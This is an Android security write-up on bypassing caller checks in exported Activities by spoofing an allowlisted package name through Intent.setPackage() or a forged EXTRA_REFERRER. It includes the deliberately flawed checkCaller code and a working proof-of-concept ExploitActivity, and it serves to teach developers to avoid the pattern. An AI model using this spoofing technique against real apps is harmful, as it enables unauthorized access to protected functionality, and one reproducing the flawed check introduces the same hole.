Bypassing Insecure Activity Access Controls

TL;DR

Some developers implement security checks inside Android Activities using getCallingPackage(), getCallingActivity(), Intent.getPackage(), and the referrer to verify which package is calling a component that performs a sensitive action.

This is not a safe way to perform caller verification: these values do not reliably identify the application that initiated the IPC, and some of them can be supplied by the caller itself — allowing an untrusted application to impersonate an allowlisted package and bypass the check.

1. Background: IPC and Caller Trust

Android applications can communicate with each other through Inter-Process Communication (IPC), including Activities launched through Intents.

When an Activity is exported, other applications may be able to invoke it. If the Activity exposes sensitive functionality, the application needs a reliable way to determine whether the caller is authorized.

A common mistake is to treat information contained in the Intent as proof of the caller's identity.

For example, an application may retrieve a package name from the Intent, check whether that package is on an allowlist, and then verify its signing certificate.

This approach is unsafe when the package name itself can be supplied or influenced by the untrusted application making the request.

The important distinction is:

Package name supplied by the caller
                !=
Identity of the process that made the IPC request

Caller-controlled metadata should therefore not be treated as an authenticated identity.

2. Vulnerability Deep Dive: The Flawed Verification Logic

A code snippet vulnerable to this type of logic is the following:

private String checkCaller(Intent startIntent) {
    String packageName = null;

    if (getCallingPackage() != null) {
        packageName = getCallingPackage();
    } else if (getCallingActivity() != null
            && getCallingActivity().getPackageName() != null) {
        packageName = getCallingActivity().getPackageName();
    } else if (startIntent.getPackage() != null) {
        packageName = startIntent.getPackage();
    } else {
        if (getReferrer() != null && getReferrer().getHost() != null) {
            packageName = getReferrer().getHost();
        }
    }

    // Checking if packageName is on allowlist
    if (listOfTrustedPackages.contains(packageName)) {
        return isPackageSecureSigned(packageName);
    } else {
        return false;
    }
}

The code attempts to identify the caller using several different sources. Once a package name is obtained, the application checks whether it belongs to listOfTrustedPackages and then verifies its signing certificate using isPackageSecureSigned().

The problem is that these sources do not all provide an authenticated caller identity.

getCallingPackage() and getCallingActivity() provide caller information in specific Android invocation contexts. However, when those values are unavailable, the application falls back to startIntent.getPackage() and getReferrer().getHost().

These values should not be considered proof of the application's identity.

An attacker can therefore reach a situation where the value stored in packageName comes from attacker-controlled Intent data.

The second problem is the signature validation.

If isPackageSecureSigned(packageName) internally performs a package lookup such as:

PackageManager.getPackageInfo(
    packageName,
    PackageManager.GET_SIGNING_CERTIFICATES
);

the application is verifying the package identified by the supplied string.

For example:

packageName = "com.trusted.allowlistedapp"

causes the application to look up the installed package with that name and verify its certificate.

This does not prove that com.trusted.allowlistedapp was the application that actually initiated the IPC.

The resulting trust flow is therefore:

Attacker-controlled package name
                |
                v
       Allowlist validation
                |
                v
      Package signature lookup
                |
                v
          Access granted

3. Exploitation Vectors and Bypass Mechanics

There are several ways the validation logic can be reached with an attacker-controlled package name.

Vector A: getCallingActivity() / getCallingPackage()

The application first checks:

getCallingPackage()

and then:

getCallingActivity()

These APIs are not a universal way to authenticate the application that started an Activity.

Depending on how the Activity is launched, these values may be unavailable. An attacker can therefore invoke the exported Activity through a normal startActivity() flow and cause the application to continue to the fallback checks.

The important point is that a null result does not mean that the caller is trusted. It only means that this particular caller information is not available in that context.

Vector B: Intent.getPackage()

If the previous checks do not provide a package name, the application checks:

else if (startIntent.getPackage() != null) {
    packageName = startIntent.getPackage();
}

Intent.getPackage() identifies a package restriction used when resolving or delivering the Intent. It does not identify the application that created the Intent.

If the application treats this value as the caller's identity, it is trusting a value that belongs to the Intent rather than the IPC caller.

For example:

Intent intent = new Intent();

intent.setPackage("com.trusted.allowlistedapp");

intent.setClassName(
    "com.victim.targetapp",
    "com.victim.targetapp.VulnerableActivity"
);

startActivity(intent);

This works because getCallingPackage() and getCallingActivity() return null when the Activity is launched with a plain startActivity() call — they are only populated when the Activity is started for a result. The validation therefore falls through to the attacker-supplied package restriction, and the explicit component does not clear it: the delivered Intent still carries the package name set via setPackage().

Vector C: Explicit Component and Spoofed Referrer

Since the package restriction is attacker-controlled, Vector B is usually enough. But if the attacker wants to go through the referrer instead, the getPackage() check can be bypassed by targeting the vulnerable Activity with an explicit component and leaving the package restriction unset:

Intent intent = new Intent();

ComponentName componentName = new ComponentName(
    "com.victim.targetapp",
    "com.victim.targetapp.VulnerableActivity"
);

intent.setComponent(componentName);

With an explicit component, intent.getPackage() can remain null.

The validation code then reaches the referrer:

if (getReferrer() != null && getReferrer().getHost() != null) {
    packageName = getReferrer().getHost();
}

The attacker can provide a referrer containing the package name of an allowlisted application:

Uri fakeReferrer =
    Uri.parse("android-app://com.trusted.allowlistedapp");

intent.putExtra(Intent.EXTRA_REFERRER, fakeReferrer);

startActivity(intent);

The resulting flow is:

getCallingPackage() -> unavailable
        |
        v
getCallingActivity() -> unavailable
        |
        v
intent.getPackage() -> null
        |
        v
getReferrer().getHost()
        |
        v
com.trusted.allowlistedapp
        |
        v
Allowlist check -> passed
        |
        v
Signature check of installed trusted package -> passed

The application has now accepted a package name supplied through Intent metadata and used it as the basis for authorization.

4. Proof of Concept

The following PoC demonstrates the attack from an untrusted application:

package com.attacker.poc;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class ExploitActivity extends AppCompatActivity {

    private static final String TARGET_PKG =
            "com.victim.targetapp";

    private static final String TARGET_ACTIVITY =
            "com.victim.targetapp.VulnerableActivity";

    private static final String TRUSTED_PKG =
            "com.trusted.allowlistedapp";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        triggerBypass();
    }

    private void triggerBypass() {
        Intent exploitIntent = new Intent();

        // Target the vulnerable Activity directly
        ComponentName target = new ComponentName(
                TARGET_PKG,
                TARGET_ACTIVITY
        );

        exploitIntent.setComponent(target);

        // Provide the trusted package through the referrer
        Uri spoofedReferrer =
                Uri.parse("android-app://" + TRUSTED_PKG);

        exploitIntent.putExtra(
                Intent.EXTRA_REFERRER,
                spoofedReferrer
        );

        // Launch the Activity without requesting a result
        startActivity(exploitIntent);
    }
}

If the vulnerable Activity is exported and the described validation logic is present, the attacker can attempt to reach the Activity while supplying the name of the trusted application through the referrer.

The expected vulnerable flow is:

Attacker application
        |
        | startActivity()
        v
Victim's exported Activity
        |
        | getCallingPackage() unavailable
        | getCallingActivity() unavailable
        v
getReferrer().getHost()
        |
        | "com.trusted.allowlistedapp"
        v
Allowlist check
        |
        v
Signature check
        |
        v
Authorization bypass

The final impact depends on what functionality is exposed by the vulnerable Activity. If the Activity performs a sensitive operation after the caller check, that operation becomes accessible to an untrusted application.

5. Root Cause Analysis

The root cause is the use of multiple Intent-related values as if they represented the authenticated identity of the caller.

Indicator Intended purpose Security issue
getCallingPackage() Identify the package associated with the calling context Availability depends on how the Activity was launched
getCallingActivity() Identify the calling Activity in supported invocation contexts Not a universal caller authentication mechanism
Intent.getPackage() Restrict Intent resolution to a package Does not represent the caller
Intent.EXTRA_REFERRER / getReferrer() Provide information about the source of an Activity launch Should not be treated as authenticated caller identity

The signature check itself is not necessarily the problem.

The problem is the value being passed to it.

If the application does this:

isPackageSecureSigned(packageName);

and packageName was obtained from attacker-controlled Intent metadata, the signature check can validate a legitimate trusted application without proving that the trusted application made the request.

In other words:

Trusted package installed on device
                !=
Trusted package made this IPC request

This is the core of the vulnerability.

The application should use Android-enforced access controls or another mechanism that validates the actual caller rather than trusting package names supplied through the Intent.
